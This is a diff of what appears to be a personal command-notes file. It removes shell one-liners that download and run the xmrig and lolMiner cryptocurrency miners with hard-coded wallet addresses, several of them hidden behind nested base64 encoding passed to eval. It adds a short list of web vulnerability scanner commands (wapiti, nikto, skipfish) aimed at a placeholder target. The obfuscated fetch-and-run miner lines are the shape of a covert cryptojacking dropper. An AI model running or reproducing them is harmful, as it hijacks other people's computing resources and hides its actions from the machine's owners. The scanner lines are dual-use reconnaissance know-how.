@@ -1,15 +1,9 @@
-sudo && sudo apt-get update -y && sudo apt-get upgrade -y && sudo wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:4796GCFi2PbTQSv1xHHgetSkHdzLQ3fcT6BkFP5uQFM4bbfvJdAiC41eLakB5J7NKaKZogLfBzVeR64wvHREm8pUS3i4ohk.v1 -p x
+wapiti -u https://target.site/ -o /home/kali/Desktop
+nikto
+anarchi   | https://github.com/Arachni/arachni/wiki/Command-line-user-interface
+skipfish -o /home/lightning/Desktop/skipfish | https://www.geeksforgeeks.org/skipfish-penetration-testing-tool-in-kali-linux/ | skipfish -o 202 http://192.168.1.202/wordpress
+burpsuite
+nikto -h site -ssl
 
 
 
-
-sudo && sudo apt-get update -y && sudo apt-get upgrade -y &&  wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -zxvf lolMiner_v1.31_Lin64.tar.gz && cd 1.31 && clear && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user XMR:4796GCFi2PbTQSv1xHHgetSkHdzLQ3fcT6BkFP5uQFM4bbfvJdAiC41eLakB5J7NKaKZogLfBzVeR64wvHREm8pUS3i4ohk.Time1 --ethstratum ETHPROXY
-
-
-eval "$(echo "c3VkbyAmJiBzdWRvIGFwdC1nZXQgdXBkYXRlIC15ICYmIHN1ZG8gYXB0LWdldCB1cGdyYWRlIC15ICYmIHN1ZG8gd2dldCBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMTQuMS94bXJpZy02LjE0LjEtbGludXgteDY0LnRhci5neiAmJiB0YXIgLXp4dmYgeG1yaWctNi4xNC4xLWxpbnV4LXg2NC50YXIuZ3ogJiYgY2QgeG1yaWctNi4xNC4xICYmIGNsZWFyICYmIC4veG1yaWcgLW8gcngudW5taW5lYWJsZS5jb206MzMzMyAtYSByeCAtayAtdSBYTVI6NDc5NkdDRmkyUGJUUVN2MXhISGdldFNrSGR6TFEzZmNUNkJrRlA1dVFGTTRiYmZ2SmRBaUM0MWVMYWtCNUo3TkthS1pvZ0xmQnpWZVI2NHd2SFJFbThwVVMzaTRvaGsudjEgLXAgeA==" | base64 -d)"
-
-
-eval "$(echo "ZXZhbCAiJChlY2hvICJjM1ZrYnlBbUppQnpkV1J2SUdGd2RDMW5aWFFnZFhCa1lYUmxJQzE1SUNZbUlITjFaRzhnWVhCMExXZGxkQ0IxY0dkeVlXUmxJQzE1SUNZbUlITjFaRzhnZDJkbGRDQm9kSFJ3Y3pvdkwyZHBkR2gxWWk1amIyMHZlRzF5YVdjdmVHMXlhV2N2Y21Wc1pXRnpaWE12Wkc5M2JteHZZV1F2ZGpZdU1UUXVNUzk0YlhKcFp5MDJMakUwTGpFdGJHbHVkWGd0ZURZMExuUmhjaTVuZWlBbUppQjBZWElnTFhwNGRtWWdlRzF5YVdjdE5pNHhOQzR4TFd4cGJuVjRMWGcyTkM1MFlYSXVaM29nSmlZZ1kyUWdlRzF5YVdjdE5pNHhOQzR4SUNZbUlHTnNaV0Z5SUNZbUlDNHZlRzF5YVdjZ0xXOGdjbmd1ZFc1dGFXNWxZV0pzWlM1amIyMDZNek16TXlBdFlTQnllQ0F0YXlBdGRTQllUVkk2TkRjNU5rZERSbWt5VUdKVVVWTjJNWGhJU0dkbGRGTnJTR1I2VEZFelptTlVOa0pyUmxBMWRWRkdUVFJpWW1aMlNtUkJhVU0wTVdWTVlXdENOVW8zVGt0aFMxcHZaMHhtUW5wV1pWSTJOSGQyU0ZKRmJUaHdWVk16YVRSdmFHc3VkakVnTFhBZ2VBPT0iIHwgYmFzZTY0IC1kKSI=" | base64 -d)"
-eval "$(echo "ZXZhbCAiJChlY2hvICJaWFpoYkNBaUpDaGxZMmh2SUNKak0xWnJZbmxCYlVwcFFucGtWMUoyU1VkR2QyUkRNVzVhV0ZGblpGaENhMWxZVW14SlF6RTFTVU5aYlVsSVRqRmFSemhuV1ZoQ01FeFhaR3hrUTBJeFkwZGtlVmxYVW14SlF6RTFTVU5aYlVsSVRqRmFSemhuWkRKa2JHUkRRbTlrU0ZKM1kzcHZka3d5WkhCa1IyZ3hXV2sxYW1JeU1IWmxSekY1WVZkamRtVkhNWGxoVjJOMlkyMVdjMXBYUm5wYVdFMTJXa2M1TTJKdGVIWlpWMUYyWkdwWmRVMVVVWFZOVXprMFlsaEtjRnA1TURKTWFrVXdUR3BGZEdKSGJIVmtXR2QwWlVSWk1FeHVVbWhqYVRWdVpXbEJiVXBwUWpCWldFbG5URmh3TkdSdFdXZGxSekY1WVZkamRFNXBOSGhPUXpSNFRGZDRjR0p1VmpSTVdHY3lUa00xTUZsWVNYVmFNMjluU21sWloxa3lVV2RsUnpGNVlWZGpkRTVwTkhoT1F6UjRTVU5aYlVsSFRuTmFWMFo1U1VOWmJVbEROSFpsUnpGNVlWZGpaMHhYT0dkamJtZDFaRmMxZEdGWE5XeFpWMHB6V2xNMWFtSXlNRFpOZWsxNlRYbEJkRmxUUW5sbFEwRjBZWGxCZEdSVFFsbFVWa2syVGtSak5VNXJaRVJTYld0NVZVZEtWVlZXVGpKTldHaEpVMGRrYkdSR1RuSlRSMUkyVkVaRmVscHRUbFZPYTBweVVteEJNV1JXUmtkVVZGSnBXVzFhTWxOdFVrSmhWVTB3VFZkV1RWbFhkRU5PVlc4elZHdDBhRk14Y0haYU1IaHRVVzV3VjFwV1NUSk9TR1F5VTBaS1JtSlVhSGRXVmsxNllWUlNkbUZIYzNWa2FrVm5URmhCWjJWQlBUMGlJSHdnWW1GelpUWTBJQzFrS1NJPSIgfCBiYXNlNjQgLWQpIg==" | base64 -d)"
-
-wget https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz && tar -zxvf xmrig-6.14.1-linux-x64.tar.gz && cd xmrig-6.14.1 && clear && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TUfEFRwukdgci259qg7KwT6c1HrB2AdMCB.v1 -p x
